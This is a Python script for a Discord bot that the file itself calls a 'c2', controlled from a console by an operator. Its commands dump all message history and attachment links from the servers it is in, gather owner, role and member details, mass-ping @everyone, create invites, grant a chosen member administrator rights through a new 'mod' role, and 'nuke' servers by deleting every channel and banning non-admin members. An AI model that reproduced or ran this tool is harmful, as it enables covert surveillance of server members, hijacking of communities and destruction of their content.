import discord
import asyncio

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'logged on as {client.user}')
    print("servers the c2 is in:")
    for guild in client.guilds:
        print(f'{guild.name} (ID: {guild.id})')
    client.loop.create_task(loop())

async def leave():
    for guild in client.guilds:
        await guild.leave()
    print("left all servers.")

async def dump(*args):
    if '--all' in args:
        for guild in client.guilds:
            await dump_guild(guild)
        print("dumped all servers.")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"no server found with ID: {guild_id}")
            return
        await dump_guild(guild)
        print(f"dumped server {guild.name}.")

async def dump_guild(guild):
    file_name = f'{guild.id}_messages.txt'
    with open(file_name, 'w', encoding='utf-8') as f:
        for channel in guild.text_channels:
            await dumpler(channel, f)
        for thread in guild.threads:
            await dumpler(thread, f)
    print(f"msgs dumped from server {guild.name}")

async def dumpler(channel, file):
    try:
        async for message in channel.history(limit=None):
            file.write(f'{message.created_at} - {message.author} (ID: {message.author.id}): {message.content}\n')
            for attachment in message.attachments:
                file.write(f'ATTACHMENT: {attachment.url}\n')
    except Exception as e:
        print(f"couldn't read msgs from {channel.name}: {e}")

async def recon(*args):
    if '--all' in args:
        for guild in client.guilds:
            await recon_guild(guild)
        print("----------------------------------------")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"no server found with ID: {guild_id}")
            return
        await recon_guild(guild)
        print(f"recon info from server {guild.name}.")

async def recon_guild(guild):
    print(f"recon for {guild.name} (ID: {guild.id}):")
    print(f"owner: {guild.owner} (ID: {guild.owner.id})")
    print(f"creation Date: {guild.created_at}")
    print(f"total Members: {guild.member_count}")
    print(f"boosts: {guild.premium_subscription_count}")
    servidinfo(guild)
    print("recon complete.")

def servidinfo(guild):
    print("roles:")
    for role in guild.roles:
        print(f' - {role.name} (ID: {role.id})')
    print("channels:")
    for channel in guild.channels:
        channel_type = 'Text' if isinstance(channel, discord.TextChannel) else 'Voice'
        print(f' - {channel.name} ({channel_type}, ID: {channel.id})')
    print("members:")
    client.loop.create_task(members(guild))

async def members(guild):
    async for member in guild.fetch_members(limit=None):
        roles = ', '.join([role.name for role in member.roles])
        print(f' - {member} (ID: {member.id}), Roles: {roles}, Joined: {member.joined_at}, Status: {member.status}')

async def sendmsg(guild_id, message):
    guild = discord.utils.get(client.guilds, id=int(guild_id))
    if not guild:
        print(f"no server found with ID: {guild_id}")
        return
    
    for channel in guild.text_channels:
        try:
            await channel.send(f'@everyone {message}')
            print(f'msg sent to {channel.name}')
            break
        except Exception as e:
            print(f"couldn't send message to {channel.name}: {e}")

async def memberlist(*args):
    if '--all' in args:
        for guild in client.guilds:
            await memberlist_guild(guild)
        print("----------------------------------------")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"no server found with ID: {guild_id}")
            return
        await memberlist_guild(guild)
        print(f"member list from server {guild.name}.")

async def memberlist_guild(guild):
    print(f'members in {guild.name}:')
    async for member in guild.fetch_members(limit=None):
        print(f'{member.name}#{member.discriminator} (ID: {member.id})')

async def inv(guild_id):
    guild = discord.utils.get(client.guilds, id=int(guild_id))
    if not guild:
        print(f"no server found with ID: {guild_id}")
        return
    
    for channel in guild.text_channels:
        try:
            invite = await channel.create_invite(max_age=300, max_uses=1)
            print(f'invite created: {invite.url}')
            break
        except Exception as e:
            print(f"couldn't create invite in {channel.name}: {e}")

async def escalatemod(guild_id, identifier):
    guild = discord.utils.get(client.guilds, id=int(guild_id))
    if not guild:
        print(f"no server found with ID: {guild_id}")
        return
    
    if identifier.isdigit():
        member = guild.get_member(int(identifier))
    else:
        member = discord.utils.get(guild.members, name=identifier)
    
    if not member:
        print(f"no member found with ID: {identifier}")
        return
    
    role = discord.utils.get(guild.roles, name='mod')
    if not role:
        try:
            role = await guild.create_role(name='mod', permissions=discord.Permissions(administrator=True))
            print("created mod role.")
        except Exception as e:
            print(f"failed to create mod role: {e}")
            return
    
    try:
        await member.add_roles(role)
        print(f"gave mod to {member}.")
    except Exception as e:
        print(f"could not give {member} mod: {e}")

async def nuke(*args):
    if '--all' in args:
        for guild in client.guilds:
            await nuke_server(guild)
        print("nuked all servers.")
    else:
        guild_id = args[0]
        guild = discord.utils.get(client.guilds, id=int(guild_id))
        if not guild:
            print(f"no server found with ID: {guild_id}")
            return
        await nuke_server(guild)
        print(f"nuked server {guild.name}.")

async def nuke_server(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"deleted channel: {channel.name}")
        except Exception as e:
            print(f"failed to delete channel {channel.name}: {e}")
    
    for member in guild.members:
        if guild.owner_id != member.id and not member.guild_permissions.administrator:
            try:
                await guild.ban(member)
                print(f"Banned member: {member.name}#{member.discriminator}")
            except Exception as e:
                print(f"couldn't ban member {member.name}#{member.discriminator}: {e}")

async def usage(command=None):
    usage_info = {
        '!DUMP': '!DUMP <server_id> [--all] - dumps messages from all channels of a specific server or all servers if --all is used.',
        '!RECON': '!RECON <server_id> [--all] - get information for a specific server or all servers if --all is used.',
        '!MEMBERLIST': '!MEMBERLIST <server_id> [--all] - Lists members of a specific server or all servers if --all is used.',
        '!NUKE': '!NUKE <server_id> [--all] - deletes all channels and bans all members of a specific server or all servers if --all is used.',
        '!INV': '!INV <server_id> - creates an invite link for a specific server.',
        '!MOD': '!MOD <server_id> <member_id|member_name> - grants the "mod" role to a specified member.',
        '!LEAVE': '!LEAVE - makes the bot leave all servers it is in.',
        '!USAGE': '!USAGE [command] - displays usage information for all commands or a specific command if specified.',
    }
    if command:
        print(usage_info.get(command.upper(), "no usage information available for this command."))
    else:
        print("usage info:")
        for cmd, desc in usage_info.items():
            print(desc)

async def loop():
    commands = {
        '!LEAVE': leave,
        '!DUMP': dump,
        '!RECON': recon,
        '!MESSAGE': sendmsg,
        '!MEMBERLIST': memberlist,
        '!INV': inv,
        '!MOD': escalatemod,
        '!NUKE': nuke,
        '!USAGE': usage,
    }

    while True:
        command = input("give command: ").strip()
        if not command:
            continue 
        parts = command.split()
        if not parts:
            continue 
        cmd = parts[0].upper()

        if cmd in commands:
            args = parts[1:]
            await commands[cmd](*args)
        else:
            print("unrecognized command. Use !USAGE for help.")

async def main():
    token = input("enter c2 token: ")
    await client.start(token)

if __name__ == "__main__":
    asyncio.run(main())
